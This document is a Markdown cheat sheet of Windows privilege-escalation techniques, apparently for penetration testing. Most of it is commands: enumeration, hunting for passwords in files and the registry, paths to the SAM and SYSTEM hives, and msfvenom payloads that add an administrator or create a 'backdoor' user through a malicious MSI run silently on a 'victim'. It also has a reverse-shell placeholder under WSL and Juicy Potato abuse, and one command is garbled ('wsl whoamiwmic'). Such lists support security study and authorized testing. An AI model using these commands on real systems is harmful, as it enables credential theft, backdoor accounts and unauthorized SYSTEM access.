






### Automated  Tools
##### 1.	JAWS – Just Another Windows (Enum) Script
https://github.com/411Hall/JAWS

##### 2.	PowerSploit-
https://github.com/PowerShellMafia/PowerSploit

##### 3.	Windows-Exploit-Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

##### 4.	Sherlock
https://github.com/rasta-mouse/Sherlock

##### 5.	Powerless
https://github.com/M4ximuss/Powerless


### 1.	EOP : System Information
Finding installed software, running processes, bind ports, and OS version
##### Windows Version and Configuration
- Systeminfo
- systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
- hostname

##### User Enumeration
- echo %username%
- net users
- net user <username>

##### Network Enumeration
- ipconfig /all
- route print
- arp -A
- netstat –ano

##### Firewall Enumeration
- netsh advfirewall firewall dump
- netsh firewall show state
- netsh firewall show config

##### System Patchs and updates
- wmic qfe
- wmic qfe get Caption,Description,HotFixID,InstalledOn



### 2.	EOP : Passwords And Hashes

##### Commands
- findstr /si password *.txt
- findstr /si password *.xml
- findstr /si password *.ini

#Find all those strings in config files.
- dir /s *pass* == *cred* == *vnc* == *.config*

#Find all passwords in all files.
- findstr /spin "password" *.*
- findstr /spin "password" *.*


##### SAM and SYSTEM files
- C:\Windows\repair\SAM
- C:\Windows\System32\config\RegBack\SAM
- C:\Windows\System32\config\SAM
- C:\Windows\repair\system
- C:\Windows\System32\config\SYSTEM
- C:\Windows\System32\config\RegBack\system

##### Search for file contents
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml\*vnc.ini /s /b
- dir c: C:\unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- dir c:\*ultravnc.ini /s /b
- dir c:\ /s /b | findstr /si *vnc.ini

##### Search the registry for key names and passwords
- REG QUERY HKLM /F "password" /t REG_SZ /S /K
- REG QUERY HKCU /F "password" /t REG_SZ /S /K

##### Passwords stored in services
###### Windows Autologin
- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 

###### SNMP parameters
- reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 

###### Putty clear text proxy credentials
- reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

###### VNC credentials
- reg query "HKCU\Software\ORL\WinVNC3\Password"
- reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

##### Powershell history
- C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
- 	$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


### 3.	EOP : Processes Enumeration and Tasks

##### Running Processes
- tasklist /v
- net start
- sc query
- Get-Service
- Get-Process
- tasklist /v /fi "username eq system"

##### Powershell
- REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion

##### Installed Programs
- Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
- Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

##### List services
- net start
- wmic service list brief
- tasklist /SVC

##### Scheduled Tasks
- schtasks /query /fo LIST 2>nul | findstr TaskName

##### Startup Tasks
- wmic startup get caption,command
- reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R(Run/RunOnce)
- dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"



### 4. EOP : Incorrect/Weak permissions in services

##### Metasploit exploit : exploit/windows/local/service_permissions

##### Services pointing to writeable locations:
1.	Orphaned installs, not installed anymore but still exist in startup
2.	DLL Hijacking
3.	PATH directories with weak permissions

### 5.	EOP : Windows Subsystem for Linux (WSL)

##### Commands
1.	wsl whoami
2.	./ubuntun1604.exe config --default-user root
3.	wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'

##### Binary bash.exe 
- C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe

##### WSL filesystem 
- C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\

### 6.	EOP : Unquoted Service Paths
- wsl whoamiwmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 

###### Example-
- Suppose we found: C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
- check for permissions of folder path
icacls "C:\Program Files (x86)\Program Folder" 
###### Exploit -
- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
- Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
- Open command prompt and type: 
•	sc start unquotedsrvc
•	net localgroup Administrators


### 7.	EoP : Kernel Exploitation
##### List of kernel exploits : https://github.com/SecWiki/windows-kernel-exploits
- Look for hotfixes - systeminfo
- wmic qfe get Caption,Description,HotFixID,InstalledOn
- Search for exploits - site:exploit-db.com 

### 8.	EOP : AlwaysInstallElevated

##### This allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

1.	Check if these 2 registry values are set to "1":
- $reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
- $reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
2.	If they are, create your own malicious msi:
- $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
3.	Then use msiexec on victim to execute your msi:
- $ msiexec /quiet /qn /i C:\evil.msi

### 9.	EOP : Vulnerable Drivers

- ##### Command -  driverquery

### 10.	EOP : From local administrator to NT SYSTEM
- ##### Psexec.exe -i -s cmd.exe


### 11.	EOP : Impersonation Privileges
https://wiki.get-root.sh/books/windows/page/rottenlonelyjuicy-potato

##### Juicy Potato (abusing the golden privileges)
- Binary available at : https://github.com/ohpe/juicy-potato/releases

- Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)
- ##### whoami /priv
- Execute JuicyPotato to run a privileged command.
##### Lonely Potato
- https://decoder.cloud/2017/12/23/the-lonely-potato/
##### Hot Potato
- https://foxglovesecurity.com/2016/01/16/hot-potato/

### 12.	EOP : Common Vulnerabilities and Exposures
- MS08-067 (NetAPI)
- MS10-015 (KiTrap0D)
- MS11-080 (adf.sys)
- MS15-051 (Client Copy Image)
- MS16-032
- MS17-010 (Eternal Blue)
